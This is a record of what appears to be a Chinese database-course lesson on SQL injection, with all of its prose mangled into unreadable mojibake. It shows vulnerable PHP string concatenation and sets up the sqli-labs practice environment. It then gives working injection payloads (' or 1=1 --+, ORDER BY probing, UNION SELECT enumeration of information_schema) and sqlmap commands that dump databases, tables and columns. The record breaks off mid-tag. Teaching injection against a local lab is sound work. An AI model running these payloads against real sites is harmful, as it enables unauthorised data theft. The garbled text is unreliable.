{"id":137050,"title":"37ä¸¨SQLæ³¨å…¥ï¼šä½ çš„SQLæ˜¯å¦‚ä½•è¢«æ³¨å…¥çš„ï¼Ÿ","content":"<p>æˆ‘ä»¬ä¹‹å‰å·²ç»è®²è§£äº†SQLçš„ä½¿ç”¨åŠä¼˜åŒ–ï¼Œæ­£å¸¸çš„SQLè°ƒç”¨å¯ä»¥å¸®æˆ‘ä»¬ä»æ•°æ®åº“ä¸­è·å–æƒ³è¦çš„æ•°æ®ï¼Œç„¶è€Œæˆ‘ä»¬æ„å»ºçš„Webåº”ç”¨æ˜¯ä¸ªåº”ç”¨ç¨‹åºï¼Œæœ¬èº«ä¹Ÿå¯èƒ½å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œå¦‚æœä¸åŠ ä»¥æ³¨æ„ï¼Œå°±ä¼šå‡ºç°Webå®‰å…¨çš„éšæ‚£ï¼Œæ¯”å¦‚é€šè¿‡éæ­£å¸¸çš„æ–¹å¼æ³¨å…¥SQLã€‚</p><p>åœ¨è¿‡å»çš„å‡ å¹´ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½ç»å¸¸çœ‹åˆ°ç”¨æˆ·ä¿¡æ¯è¢«æ³„éœ²ï¼Œå‡ºç°è¿™ç§æƒ…å†µï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šå’ŒSQLæ³¨å…¥æœ‰å…³ã€‚æ‰€ä»¥äº†è§£SQLæ³¨å…¥çš„åŸç†ä»¥åŠé˜²èŒƒè¿˜æ˜¯éå¸¸æœ‰å¿…è¦çš„ã€‚</p><p>ä»Šå¤©æˆ‘ä»¬å°±é€šè¿‡ä¸€ä¸ªç®€å•çš„ç»ƒä¹ çœ‹ä¸‹SQLæ³¨å…¥çš„è¿‡ç¨‹æ˜¯æ€æ ·çš„ï¼Œå†…å®¹ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š</p><ol>\n<li>SQLæ³¨å…¥çš„åŸç†ã€‚ä¸ºä»€ä¹ˆç”¨æˆ·å¯ä»¥é€šè¿‡URLè¯·æ±‚æˆ–è€…æäº¤Webè¡¨å•çš„æ–¹å¼æäº¤éæ³•SQLå‘½ä»¤ï¼Œä»è€Œè®¿é—®æ•°æ®åº“ï¼Ÿ</li>\n<li>å¦‚ä½•ä½¿ç”¨sqli-labsæ³¨å…¥å¹³å°è¿›è¡Œç¬¬ä¸€ä¸ªSQLæ³¨å…¥å®éªŒï¼Ÿ</li>\n<li>å¦‚ä½•ä½¿ç”¨SQLmapå®ŒæˆSQLæ³¨å…¥æ£€æµ‹ï¼Ÿ</li>\n</ol><h2>SQLæ³¨å…¥çš„åŸç†</h2><p>SQLæ³¨å…¥ä¹Ÿå«ä½œSQL Injectionï¼Œå®ƒæŒ‡çš„æ˜¯å°†éæ³•çš„SQLå‘½ä»¤æ’å…¥åˆ°URLæˆ–è€…Webè¡¨å•ä¸­è¿›è¡Œè¯·æ±‚ï¼Œè€Œè¿™äº›è¯·æ±‚è¢«æœåŠ¡å™¨è®¤ä¸ºæ˜¯æ­£å¸¸çš„SQLè¯­å¥ä»è€Œè¿›è¡Œæ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦è¿›è¡ŒSQLæ³¨å…¥ï¼Œå¯ä»¥å°†æƒ³è¦æ‰§è¡Œçš„SQLä»£ç éšè—åœ¨è¾“å…¥çš„ä¿¡æ¯ä¸­ï¼Œè€Œæœºå™¨æ— æ³•è¯†åˆ«å‡ºæ¥è¿™äº›å†…å®¹æ˜¯ç”¨æˆ·ä¿¡æ¯ï¼Œè¿˜æ˜¯SQLä»£ç ï¼Œåœ¨åå°å¤„ç†è¿‡ç¨‹ä¸­ï¼Œè¿™äº›è¾“å…¥çš„SQLè¯­å¥ä¼šæ˜¾ç°å‡ºæ¥å¹¶æ‰§è¡Œï¼Œä»è€Œå¯¼è‡´æ•°æ®æ³„éœ²ï¼Œç”šè‡³è¢«æ›´æ”¹æˆ–åˆ é™¤ã€‚</p><!-- [[[read_end]]] --><p>ä¸ºä»€ä¹ˆæˆ‘ä»¬å¯ä»¥å°†SQLè¯­å¥éšè—åœ¨è¾“å…¥çš„ä¿¡æ¯ä¸­å‘¢ï¼Ÿè¿™é‡Œä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ã€‚</p><p>æ¯”å¦‚ä¸‹é¢çš„PHPä»£ç å°†æµè§ˆå™¨å‘é€è¿‡æ¥çš„URLè¯·æ±‚ï¼Œé€šè¿‡GETæ–¹å¼è·å–IDå‚æ•°ï¼Œèµ‹å€¼ç»™$idå˜é‡ï¼Œç„¶åé€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ç»„æˆäº†SQLè¯­å¥ã€‚è¿™é‡Œæˆ‘ä»¬æ²¡æœ‰å¯¹ä¼ å…¥çš„IDå‚æ•°åšæ ¡éªŒï¼Œè€Œæ˜¯é‡‡ç”¨äº†ç›´æ¥æ‹¼æ¥çš„æ–¹å¼ï¼Œè¿™æ ·å°±å¯èƒ½äº§ç”ŸSQLæ³¨å…¥ã€‚</p><pre><code>$id=$_GET['id'];\n$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n</code></pre><p>å¦‚æœæˆ‘ä»¬åœ¨URLä¸­çš„?id=åé¢è¾“å…¥' or 1=1 --+ï¼Œé‚£ä¹ˆSQLè¯­å¥å°±å˜æˆäº†ä¸‹é¢è¿™æ ·ï¼š</p><pre><code>SELECT * FROM users WHERE id='' or 1=1 --  LIMIT 0,1\n</code></pre><p>å…¶ä¸­æˆ‘ä»¬è¾“å…¥çš„ï¼ˆ+ï¼‰åœ¨æµè§ˆå™¨URLä¸­ç›¸å½“äºç©ºæ ¼ï¼Œè€Œè¾“å…¥çš„ï¼ˆ--ï¼‰åœ¨SQLä¸­è¡¨ç¤ºæ³¨é‡Šè¯­å¥ï¼Œå®ƒä¼šå°†åé¢çš„SQLå†…å®¹éƒ½æ³¨é‡Šæ‰ï¼Œè¿™æ ·æ•´ä¸ªSQLå°±ç›¸å½“äºæ˜¯ä»usersè¡¨ä¸­è·å–å…¨éƒ¨çš„æ•°æ®ã€‚ç„¶åæˆ‘ä»¬ä½¿ç”¨mysql_fetch_arrayä»ç»“æœä¸­è·å–ä¸€æ¡è®°å½•ï¼Œè¿™æ—¶å³ä½¿IDè¾“å…¥ä¸æ­£ç¡®ä¹Ÿæ²¡æœ‰å…³ç³»ï¼ŒåŒæ ·å¯ä»¥è·å–æ•°æ®è¡¨ä¸­çš„ç¬¬ä¸€è¡Œè®°å½•ã€‚</p><h2>ä¸€ä¸ªSQLæ³¨å…¥çš„å®ä¾‹</h2><p>é€šå¸¸æˆ‘ä»¬å¸Œæœ›é€šè¿‡SQLæ³¨å…¥å¯ä»¥è·å–æ›´å¤šçš„ä¿¡æ¯ï¼Œæ¯”å¦‚æ•°æ®åº“çš„åç§°ã€æ•°æ®è¡¨åç§°å’Œå­—æ®µåç­‰ã€‚ä¸‹é¢æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªç®€å•çš„SQLå®ä¾‹æ¥æ“ä½œä¸€ä¸‹ã€‚</p><h3>æ­å»ºsqli-labsæ³¨å…¥ç¯å¢ƒ</h3><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ­å»ºsqli-labsæ³¨å…¥ç¯å¢ƒï¼Œåœ¨è¿™ä¸ªé¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬ä¼šé¢ä¸´75ä¸ªSQLæ³¨å…¥çš„æŒ‘æˆ˜ï¼Œä½ å¯ä»¥åƒæ¸¸æˆé—¯å…³ä¸€æ ·å¯¹SQLæ³¨å…¥çš„åŸç†è¿›è¡Œå­¦ä¹ ã€‚</p><p>ä¸‹é¢çš„æ­¥éª¤æ˜¯å…³äºå¦‚ä½•åœ¨æœ¬åœ°æ­å»ºsqli-labsæ³¨å…¥ç¯å¢ƒçš„ï¼ŒæˆåŠŸæ­å»ºå¥½çš„ç¯å¢ƒç±»ä¼¼<a href=\"http://43.247.91.228:84/\">é“¾æ¥</a>é‡Œå±•ç°çš„ã€‚</p><p>ç¬¬ä¸€æ­¥ï¼Œä¸‹è½½sqli-labsã€‚</p><p>sqli-labsæ˜¯ä¸€ä¸ªå¼€æºçš„SQLæ³¨å…¥å¹³å°ï¼Œä½ å¯ä»¥ä»<a href=\"https://github.com/audi-1/sqli-labs\">GitHub</a>ä¸Šä¸‹è½½å®ƒã€‚</p><p>ç¬¬äºŒæ­¥ï¼Œé…ç½®PHPã€Apacheç¯å¢ƒï¼ˆå¯ä»¥ä½¿ç”¨phpStudyå·¥å…·ï¼‰ã€‚</p><p>è¿è¡Œsqli-labséœ€è¦PHPã€Apacheç¯å¢ƒï¼Œå¦‚æœä½ ä¹‹å‰æ²¡æœ‰å®‰è£…è¿‡å®ƒä»¬ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨phpStudyè¿™ä¸ªå·¥å…·ï¼Œå®ƒä¸ä»…é›†æˆäº†PHPã€Apacheå’ŒMySQLï¼Œè¿˜å¯ä»¥æ–¹ä¾¿åœ°æŒ‡å®šPHPçš„ç‰ˆæœ¬ã€‚åœ¨ä»Šå¤©çš„é¡¹ç›®ä¸­ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯PHP5.4.45ç‰ˆæœ¬ã€‚</p><p><img src=\"https://static001.geekbang.org/resource/image/ec/f4/ecd7853d8aa4523735643d0aa67ce5f4.png?wh=835*685\" alt=\"\"><br>\nç¬¬ä¸‰æ­¥ï¼Œé…ç½®sqli-labsåŠMySQLå‚æ•°ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ç»™sqli-labsæŒ‡å®šéœ€è¦è®¿é—®çš„æ•°æ®åº“è´¦æˆ·å¯†ç ï¼Œå¯¹åº”<code>sqli-labs-master\\sql-connections\\db-creds.inc</code>æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹<code>$dbpass</code>å‚æ•°ï¼Œæ”¹æˆè‡ªå·±çš„MySQLçš„å¯†ç ã€‚</p><p><img src=\"https://static001.geekbang.org/resource/image/a2/84/a2b0bcedf13d2f6d4d0e77553c4a9484.png?wh=1247*466\" alt=\"\"><br>\næ­¤æ—¶æˆ‘ä»¬è®¿é—®æœ¬åœ°çš„<code>sqli-labs</code>é¡¹ç›®<code>http://localhost/sqli-labs-master/</code>å‡ºç°å¦‚ä¸‹é¡µé¢ï¼Œéœ€è¦å…ˆå¯åŠ¨æ•°æ®åº“ï¼Œé€‰æ‹©<code>Setup/reset Database for labs</code>å³å¯ã€‚</p><p><img src=\"https://static001.geekbang.org/resource/image/3d/a9/3d6bdc6a81df7ad708903a015233cba9.png?wh=1730*673\" alt=\"\"><br>\nå¦‚æœæ­¤æ—¶æç¤ºæ•°æ®åº“è¿æ¥é”™è¯¯ï¼Œå¯èƒ½éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨ä¿®æ”¹MySQLçš„é…ç½®æ–‡ä»¶ï¼Œéœ€è¦è°ƒæ•´çš„å‚æ•°å¦‚ä¸‹æ‰€ç¤ºï¼ˆä¿®æ”¹MySQLå¯†ç éªŒè¯æ–¹å¼ä¸ºä½¿ç”¨æ˜æ–‡ï¼ŒåŒæ—¶è®¾ç½®MySQLé»˜è®¤çš„ç¼–ç æ–¹å¼ï¼‰ï¼š</p><pre><code>[client]\ndefault-character-set=utf8\n[mysql]\ndefault-character-set=utf8\n[mysqld]\ncharacter-set-server = utf8\ndefault_authentication_plugin = mysql_native_password\n</code></pre><h3>ç¬¬ä¸€ä¸ªSQLæ³¨å…¥æŒ‘æˆ˜</h3><p>åœ¨æˆ‘ä»¬æˆåŠŸå¯¹sqli-labsè¿›è¡Œäº†é…ç½®ï¼Œç°åœ¨å¯ä»¥è¿›å…¥åˆ°ç¬¬ä¸€å…³æŒ‘æˆ˜ç¯èŠ‚ã€‚è®¿é—®æœ¬åœ°çš„<code>http://localhost/sqli-labs-master/Less-1/</code>é¡µé¢ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src=\"https://static001.geekbang.org/resource/image/42/74/4274d6de133192f7a1dd0348c75c0e74.png?wh=1316*200\" alt=\"\"><br>\næˆ‘ä»¬å¯ä»¥åœ¨URLåé¢åŠ ä¸ŠIDå‚æ•°ï¼Œè·å–æŒ‡å®šIDçš„ä¿¡æ¯ï¼Œæ¯”å¦‚<code>http://localhost/sqli-labs-master/Less-1/?id=1</code>ã€‚</p><p>è¿™äº›éƒ½æ˜¯æ­£å¸¸çš„è®¿é—®è¯·æ±‚ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥é€šè¿‡1 or 1=1æ¥åˆ¤æ–­IDå‚æ•°çš„æŸ¥è¯¢ç±»å‹ï¼Œè®¿é—®<code>http://localhost/sqli-labs-master/Less-1/?id=1 or 1=1</code>ã€‚</p><p><img src=\"https://static001.geekbang.org/resource/image/ea/41/eab6701bd0a40980b180d99e295b1841.png?wh=1103*344\" alt=\"\"><br>\nä½ å¯ä»¥çœ‹åˆ°ä¾ç„¶å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œè¯æ˜IDå‚æ•°ä¸æ˜¯æ•°å€¼æŸ¥è¯¢ï¼Œç„¶åæˆ‘ä»¬åœ¨1åé¢å¢åŠ ä¸ªå•å¼•å·ï¼Œæ¥æŸ¥çœ‹ä¸‹è¿”å›ç»“æœï¼Œè®¿é—®<code>http://localhost/sqli-labs-master/Less-1/?id=1'</code>ã€‚</p><p>è¿™æ—¶æ•°æ®åº“æŠ¥é”™ï¼Œå¹¶ä¸”åœ¨é¡µé¢ä¸Šè¿”å›äº†é”™è¯¯ä¿¡æ¯ï¼šYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1ã€‚</p><p>æˆ‘ä»¬å¯¹è¿™ä¸ªé”™è¯¯è¿›è¡Œåˆ†æï¼Œé¦–å…ˆ<code>''1'' LIMIT 0,1'</code>è¿™ä¸ªè¯­å¥ï¼Œæˆ‘ä»¬å»æ‰æœ€å¤–å±‚çš„å•å¼•å·ï¼Œå¾—åˆ°<code>'1'' LIMIT 0,1</code>ï¼Œå› ä¸ºæˆ‘ä»¬è¾“å…¥çš„å‚æ•°æ˜¯<code>1'</code>ï¼Œç»§ç»­å»æ‰<code>1'</code>ï¼Œå¾—åˆ°<code>'' LIMIT 0,1</code>ã€‚è¿™æ ·æˆ‘ä»¬å°±èƒ½åˆ¤æ–­å‡ºåå°çš„SQLè¯­å¥ï¼Œç±»ä¼¼äºä¸‹é¢è¿™æ ·ï¼š</p><pre><code>$sql=&quot;SELECT ... FROM ... WHERE id='$id' LIMIT 0,1&quot;;\n</code></pre><p>ä¸¤å¤„çœç•¥å·çš„åœ°æ–¹åˆ†åˆ«ä»£è¡¨SELECTè¯­å¥ä¸­çš„å­—æ®µåå’Œæ•°æ®è¡¨åç§°ã€‚</p><h3>åˆ¤æ–­æŸ¥è¯¢è¯­å¥çš„å­—æ®µæ•°</h3><p>ç°åœ¨æˆ‘ä»¬å·²ç»å¯¹åå°çš„SQLæŸ¥è¯¢å·²ç»æœ‰äº†å¤§è‡´çš„åˆ¤æ–­ï¼Œå®ƒæ˜¯é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥å®Œæˆçš„SQLæŸ¥è¯¢ã€‚ç°åœ¨æˆ‘ä»¬å†æ¥åˆ¤æ–­ä¸‹è¿™ä¸ªæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µä¸ªæ•°ï¼Œé€šå¸¸å¯ä»¥åœ¨è¾“å…¥çš„æŸ¥è¯¢å†…å®¹åé¢åŠ ä¸Š ORDER BY Xï¼Œè¿™é‡ŒXæ˜¯æˆ‘ä»¬ä¼°è®¡çš„å­—æ®µä¸ªæ•°ã€‚å¦‚æœXæ•°å€¼å¤§äºSELECTæŸ¥è¯¢çš„å­—æ®µæ•°ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚æ ¹æ®è¿™ä¸ªåŸç†ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•é€šè¿‡ä¸åŒçš„Xæ¥åˆ¤æ–­SELECTæŸ¥è¯¢çš„å­—æ®µä¸ªæ•°ï¼Œè¿™é‡Œæˆ‘ä»¬é€šè¿‡ä¸‹é¢ä¸¤ä¸ªURLå¯ä»¥åˆ¤æ–­å‡ºæ¥ï¼ŒSELECTæŸ¥è¯¢çš„å­—æ®µæ•°ä¸º3ä¸ªï¼š</p><p>æŠ¥é”™ï¼š</p><pre><code>http://localhost/sqli-labs-master/Less-1/?id=1' order by 4 --+\n</code></pre><p>æ­£ç¡®ï¼š</p><pre><code>http://localhost/sqli-labs-master/Less-1/?id=1' order by 3 --+\n</code></pre><h3>è·å–å½“å‰æ•°æ®åº“å’Œç”¨æˆ·ä¿¡æ¯</h3><p>ä¸‹é¢æˆ‘ä»¬é€šè¿‡SQLæ³¨å…¥æ¥è·å–æƒ³è¦çš„ä¿¡æ¯ï¼Œæ¯”å¦‚æƒ³è¦è·å–å½“å‰æ•°æ®åº“å’Œç”¨æˆ·ä¿¡æ¯ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨UNIONæ“ä½œç¬¦ã€‚åœ¨MySQLä¸­ï¼ŒUNIONæ“ä½œç¬¦å‰åä¸¤ä¸ªSELECTè¯­å¥çš„æŸ¥è¯¢ç»“æ„å¿…é¡»ä¸€è‡´ã€‚åˆšæ‰æˆ‘ä»¬å·²ç»é€šè¿‡å®éªŒï¼Œåˆ¤æ–­å‡ºæŸ¥è¯¢è¯­å¥çš„å­—æ®µä¸ªæ•°ä¸º3ï¼Œå› æ­¤åœ¨æ„é€ UNIONåé¢çš„æŸ¥è¯¢è¯­å¥æ—¶ä¹Ÿéœ€è¦æŸ¥è¯¢3ä¸ªå­—æ®µã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ï¼š<code>SELECT 1,database(),user()</code>ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨é»˜è®¤å€¼1æ¥ä½œä¸ºç¬¬ä¸€ä¸ªå­—æ®µï¼Œæ•´ä¸ªURLä¸ºï¼š<code>http://localhost/sqli-labs-master/Less-1/?id=' union select 1,database(),user() --+</code>ã€‚</p><p><img src=\"https://static001.geekbang.org/resource/image/a1/cd/a186b5758d80983b4d34818169b719cd.png?wh=1241*350\" alt=\"\"><br>\né¡µé¢ä¸­æ˜¾ç¤ºçš„<code>security</code>å³ä¸ºå½“å‰çš„æ•°æ®åº“åç§°ï¼Œ<code>root@localhost</code>ä¸ºå½“å‰çš„ç”¨æˆ·ä¿¡æ¯ã€‚</p><h3>è·å–MySQLä¸­çš„æ‰€æœ‰æ•°æ®åº“åç§°</h3><p>æˆ‘ä»¬è¿˜æƒ³çŸ¥é“å½“å‰MySQLä¸­æ‰€æœ‰çš„æ•°æ®åº“åç§°éƒ½æœ‰å“ªäº›ï¼Œæ•°æ®åº“åç§°æ•°é‡è‚¯å®šä¼šå¤§äº1ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨<code>GROUP_CONCAT</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥å°†<code>GROUP BY</code>äº§ç”Ÿçš„åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œå¹¶ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›ã€‚</p><p>å…·ä½“ä½¿ç”¨å¦‚ä¸‹ï¼š</p><pre><code>http://localhost/sqli-labs-master/Less-1/?id=' union select 1,2,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)--+\n</code></pre><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æŠŠå¤šä¸ªæ•°æ®åº“åç§°æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œä½œä¸ºå­—æ®µ3è¿”å›ç»™é¡µé¢ã€‚</p><p><img src=\"https://static001.geekbang.org/resource/image/7e/a7/7e1aa81c623e28c87666cfdd290462a7.png?wh=1728*142?wh=1728*142\" alt=\"\"><br>\nä½ èƒ½çœ‹åˆ°è¿™é‡Œæˆ‘ä½¿ç”¨åˆ°äº†MySQLä¸­çš„<code>information_schema</code>æ•°æ®åº“ï¼Œè¿™ä¸ªæ•°æ®åº“æ˜¯MySQLè‡ªå¸¦çš„æ•°æ®åº“ï¼Œç”¨æ¥å­˜å‚¨æ•°æ®åº“çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ¯”å¦‚æ•°æ®åº“åç§°ã€æ•°æ®è¡¨åç§°ã€åˆ—çš„æ•°æ®ç±»å‹å’Œè®¿é—®æƒé™ç­‰ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—®<code>information_schema</code>æ•°æ®åº“ï¼Œè·å¾—æ›´å¤šæ•°æ®åº“çš„ä¿¡æ¯ã€‚</p><h3>æŸ¥è¯¢wucaiæ•°æ®åº“ä¸­æ‰€æœ‰æ•°æ®è¡¨</h3><p>åœ¨ä¸Šé¢çš„å®éªŒä¸­ï¼Œæˆ‘ä»¬å·²ç»å¾—åˆ°äº†MySQLä¸­æ‰€æœ‰çš„æ•°æ®åº“åç§°ï¼Œè¿™é‡Œæˆ‘ä»¬èƒ½çœ‹åˆ°wucaiè¿™ä¸ªæ•°æ®åº“ã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦çœ‹wucaiè¿™ä¸ªæ•°æ®åº“ä¸­éƒ½æœ‰å“ªäº›æ•°æ®è¡¨ï¼Œå¯ä»¥ä½¿ç”¨ï¼š</p><pre><code>http://localhost/sqli-labs-master/Less-1/?id=' UNION SELECT 1,2,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='wucai') --+\n</code></pre><p>è¿™é‡Œæˆ‘ä»¬åŒæ ·å°†æ•°æ®è¡¨åç§°ä½¿ç”¨GROUP_CONCATå‡½æ•°æ‹¼æ¥èµ·æ¥ï¼Œä½œä¸ºå­—æ®µ3è¿›è¡Œè¿”å›ã€‚</p><p><img src=\"https://static001.geekbang.org/resource/image/7e/a7/7e1aa81c623e28c87666cfdd290462a7.png?wh=1728*142?wh=1728*142\" alt=\"\"></p><h3>æŸ¥è¯¢herosæ•°æ®è¡¨ä¸­æ‰€æœ‰å­—æ®µåç§°</h3><p>åœ¨ä¸Šé¢çš„å®éªŒä¸­ï¼Œæˆ‘ä»¬ä»wucaiæ•°æ®åº“ä¸­æ‰¾åˆ°äº†ç†Ÿæ‚‰çš„æ•°æ®è¡¨herosï¼Œç°åœ¨å°±æ¥é€šè¿‡information_schemaæ¥æŸ¥è¯¢ä¸‹herosæ•°æ®è¡¨éƒ½æœ‰å“ªäº›å­—æ®µï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤å³å¯ï¼š</p><pre><code>http://localhost/sqli-labs-master/Less-1/?id=' UNION SELECT 1,2,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='heros') --+\n</code></pre><p>è¿™é‡Œä¼šå°†å­—æ®µä½¿ç”¨GROUP_CONCATå‡½æ•°è¿›è¡Œæ‹¼æ¥ï¼Œå¹¶å°†ç»“æœä½œä¸ºå­—æ®µ3è¿›è¡Œè¿”å›ï¼Œè¿”å›çš„ç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre><code>attack_growth,attack_max,attack_range,attack_speed_max,attack_start,birthdate,defense_growth,defense_max,defense_start,hp_5s_growth,hp_5s_max,hp_5s_start,hp_growth,hp_max,hp_start,id,mp_5s_growth,mp_5s_max,mp_5s_start,mp_growth,mp_max,mp_start,name,role_assist,role_main\n</code></pre><p><img src=\"https://static001.geekbang.org/resource/image/f3/bf/f30c7a68fba4fd8eff3ea8370aca00bf.png?wh=1725*116\" alt=\"\"></p><h2>ä½¿ç”¨SQLmapå·¥å…·è¿›è¡ŒSQLæ³¨å…¥æ£€æµ‹</h2><p>ç»è¿‡ä¸Šé¢çš„å®éªŒä½ èƒ½ä½“ä¼šåˆ°ï¼Œå¦‚æœæˆ‘ä»¬ç¼–å†™çš„ä»£ç å­˜åœ¨ç€SQLæ³¨å…¥çš„æ¼æ´ï¼Œåæœè¿˜æ˜¯å¾ˆå¯æ€•çš„ã€‚é€šè¿‡è®¿é—®<code>information_schema</code>å°±å¯ä»¥å°†æ•°æ®åº“çš„ä¿¡æ¯æš´éœ²å‡ºæ¥ã€‚</p><p>äº†è§£åˆ°å¦‚ä½•å®Œæˆæ³¨å…¥SQLåï¼Œæˆ‘ä»¬å†æ¥äº†è§£ä¸‹SQLæ³¨å…¥çš„æ£€æµ‹å·¥å…·ï¼Œå®ƒå¯ä»¥å¸®æˆ‘ä»¬è‡ªåŠ¨åŒ–å®ŒæˆSQLæ³¨å…¥çš„è¿‡ç¨‹ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯SQLmapå·¥å…·ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬ä½¿ç”¨SQLmapå†æ¨¡æ‹Ÿä¸€éåˆšæ‰äººå·¥SQLæ³¨å…¥çš„æ­¥éª¤ã€‚</p><h3>è·å–å½“å‰æ•°æ®åº“å’Œç”¨æˆ·ä¿¡æ¯</h3><p>æˆ‘ä»¬ä½¿ç”¨<code>sqlmap -u</code>æ¥æŒ‡å®šæ³¨å…¥æµ‹è¯•çš„URLï¼Œä½¿ç”¨<code>--current-db</code>æ¥è·å–å½“å‰çš„æ•°æ®åº“åç§°ï¼Œä½¿ç”¨<code>--current-user</code>è·å–å½“å‰çš„ç”¨æˆ·ä¿¡æ¯ï¼Œå…·ä½“å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --current-db --current-user\n</code></pre><p>ç„¶åä½ èƒ½çœ‹åˆ°SQLmapå¸®æˆ‘ä»¬è·å–äº†ç›¸åº”çš„ç»“æœï¼š</p><p><img src=\"https://static001.geekbang.org/resource/image/42/05/42626ab164f9935e0c22ced9fa5f8105.png?wh=1097*219\" alt=\"\"></p><h3>è·å–MySQLä¸­çš„æ‰€æœ‰æ•°æ®åº“åç§°</h3><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>--dbs</code>æ¥è·å–DBMSä¸­æ‰€æœ‰çš„æ•°æ®åº“åç§°ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<code>--threads</code>å‚æ•°æ¥æŒ‡å®šSQLmapæœ€å¤§å¹¶å‘æ•°ï¼Œè®¾ç½®ä¸º5ï¼Œé€šå¸¸è¯¥å‚æ•°ä¸è¦è¶…è¿‡10ï¼Œå…·ä½“å‘½ä»¤ä¸ºä¸‹é¢è¿™æ ·ï¼š</p><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --threads=5 --dbs\n</code></pre><p>åŒæ ·SQLmapå¸®æˆ‘ä»¬è·å–äº†MySQLä¸­å­˜åœ¨çš„8ä¸ªæ•°æ®åº“åç§°ï¼š</p><p><img src=\"https://static001.geekbang.org/resource/image/b9/53/b9f9b624e863cd507c1cb1c4b1fc1853.png?wh=1284*1125\" alt=\"\"></p><h3>æŸ¥è¯¢wucaiæ•°æ®åº“ä¸­æ‰€æœ‰æ•°æ®è¡¨</h3><p>å½“æˆ‘ä»¬çŸ¥é“DBMSä¸­å­˜åœ¨çš„æŸä¸ªæ•°æ®åº“åç§°æ—¶ï¼Œå¯ä»¥ä½¿ç”¨-Då‚æ•°å¯¹æ•°æ®åº“è¿›è¡ŒæŒ‡å®šï¼Œç„¶åä½¿ç”¨<code>--tables</code>å‚æ•°æ˜¾ç¤ºå‡ºæ‰€æœ‰çš„æ•°æ®è¡¨åç§°ã€‚æ¯”å¦‚æˆ‘ä»¬æƒ³è¦æŸ¥çœ‹wucaiæ•°æ®åº“ä¸­éƒ½æœ‰å“ªäº›æ•°æ®è¡¨ï¼Œä½¿ç”¨ï¼š</p><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --threads=5 -D wucai --tables\n</code></pre><p><img src=\"https://static001.geekbang.org/resource/image/11/16/119174ae050e5a27e70ebc5537d7b116.png?wh=525*750\" alt=\"\"></p><h3>æŸ¥è¯¢herosæ•°æ®è¡¨ä¸­æ‰€æœ‰å­—æ®µåç§°</h3><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å¯¹æŒ‡å®šçš„æ•°æ®è¡¨ï¼Œæ¯”å¦‚herosè¡¨è¿›è¡Œæ‰€æœ‰å­—æ®µåç§°çš„æŸ¥è¯¢ï¼Œä½¿ç”¨<code>-D</code>æŒ‡å®šæ•°æ®åº“åç§°ï¼Œ<code>-T</code>æŒ‡å®šæ•°æ®è¡¨åç§°ï¼Œ<code>--columns</code>å¯¹æ‰€æœ‰å­—æ®µåç§°è¿›è¡ŒæŸ¥è¯¢ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --threads=5 -D wucai -T heros --columns\n</code></pre><p><img src=\"https://static001.geekbang.org/resource/image/68/6d/681d394e31a6ac44ac85f2349282886d.png?wh=913*1613\" 